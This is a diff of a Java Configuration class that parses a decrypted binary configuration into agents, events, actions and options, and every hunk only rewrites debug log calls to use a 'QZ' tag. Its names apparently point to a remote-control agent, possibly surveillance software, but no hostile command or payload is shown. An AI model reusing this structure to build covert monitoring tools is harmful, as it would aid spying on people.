@@ -174,7 +174,7 @@ public class Configuration {
 		}
 
 		confHash = (int) tempHash;
-		Log.d(TAG, "Configuration CRC: " + confHash);
+		Log.d("QZ", TAG + " Configuration CRC: " + confHash);
 		return confHash;
 	}
 
@@ -195,7 +195,7 @@ public class Configuration {
 			throw new RCSException("Tag " + tag + " not found");
 		}
 
-		Log.d(TAG, "Tag " + tag + " found at: " + index);
+		Log.d("QZ", TAG + " Tag " + tag + " found at: " + index);
 		return index;
 	}
 
@@ -220,7 +220,7 @@ public class Configuration {
 		final int agentNum = wrappedClearConf.getInt(agentTag);
 		wrappedClearConf.position(agentTag + 4);
 
-		Log.d(TAG, "Number of agents: " + agentNum);
+		Log.d("QZ", TAG + " Number of agents: " + agentNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
@@ -234,7 +234,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d(TAG, "Agent: " + id + " Enabled: " + enabled
+			Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled
 					+ " Params Len: " + plen);
 
 			final AgentConf a = new AgentConf(id, enabled, params);
@@ -265,7 +265,7 @@ public class Configuration {
 		final int eventNum = wrappedClearConf.getInt(eventTag);
 		wrappedClearConf.position(eventTag + 4);
 
-		Log.d(TAG, "Number of events: " + eventNum);
+		Log.d("QZ", TAG + " Number of events: " + eventNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < eventNum; i++) {
@@ -279,7 +279,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("QZ", TAG + "Configuration.java Event: " + type + " Action: " + action
+			Log.d("QZ", TAG + " Configuration.java Event: " + type + " Action: " + action
 					+ " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
@@ -302,7 +302,7 @@ public class Configuration {
 	private void loadActions() throws RCSException {
 		final int actionNum = wrappedClearConf.getInt();
 
-		Log.d(TAG, "Number of actions " + actionNum);
+		Log.d("QZ", TAG + " Number of actions " + actionNum);
 
 		try {
 			for (int i = 0; i < actionNum; i++) {
@@ -310,7 +310,7 @@ public class Configuration {
 
 				final Action a = new Action(i, subNum);
 
-				Log.d(TAG, "Action " + i + " SubActions: " + subNum);
+				Log.d("QZ", TAG + " Action " + i + " SubActions: " + subNum);
 
 				for (int j = 0; j < subNum; j++) {
 					final int type = wrappedClearConf.getInt();
@@ -324,7 +324,7 @@ public class Configuration {
 
 					a.addSubAction(type, params);
 
-					Log.d(TAG, "SubAction " + j + " Type: " + type
+					Log.d("QZ", TAG + " SubAction " + j + " Type: " + type
 							+ " Params Length: " + plen);
 				}
 
@@ -358,7 +358,7 @@ public class Configuration {
 		final int optionsNum = wrappedClearConf.getInt(optionsTag);
 		wrappedClearConf.position(optionsTag + 4);
 
-		Log.d(TAG, "Number of options: " + optionsNum);
+		Log.d("QZ", TAG + " Number of options: " + optionsNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < optionsNum; i++) {
@@ -371,7 +371,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d(TAG, "Option: " + id + " Params Len: " + plen);
+			Log.d("QZ", TAG + " Option: " + id + " Params Len: " + plen);
 
 			final Option o = new Option(id, params);
 			status.addOption(o);
@@ -434,17 +434,17 @@ public class Configuration {
 			}
 
 			// Return decrypted conf
-			Log.d(TAG, "Configuration is valid");
+			Log.d("QZ", TAG + " Configuration is valid");
 			return;
 		} catch (final IOException ioe) {
 			ioe.printStackTrace();
-			Log.d(TAG, "IOException() detected");
+			Log.d("QZ", TAG + " IOException() detected");
 		} catch (final SecurityException se) {
 			se.printStackTrace();
-			Log.d(TAG, "SecurityException() detected");
+			Log.d("QZ", TAG + " SecurityException() detected");
 		} catch (final Exception e) {
 			e.printStackTrace();
-			Log.d(TAG, "Exception() detected");
+			Log.d("QZ", TAG + " Exception() detected");
 		}
 
 		return;
